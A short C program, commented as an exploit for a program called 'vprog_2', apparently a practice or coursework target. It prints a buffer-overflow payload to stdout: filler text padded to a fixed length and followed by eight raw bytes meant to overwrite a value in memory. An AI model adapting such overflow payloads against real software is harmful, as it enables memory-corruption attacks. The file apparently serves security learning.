#include <stdlib.h>
#include <unistd.h>

// expl for vprog_2
unsigned char payload[] =
    "asdfghjklqwertyuio20Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula eget dol"
    "\x2f\x82\x6d\x09\xec\x0f\xa6\xe4";

int main(int argc, char **argv)
{
    /*
     * dump the payload in 'stdout'
     * sizeof(payload)-1:	ignore the trailing '\0';
     *			(strings are NULL terminated)
     */
    write(STDOUT_FILENO, payload, sizeof(payload) - 1);

    /* done; success		*/
    return EXIT_SUCCESS;
}
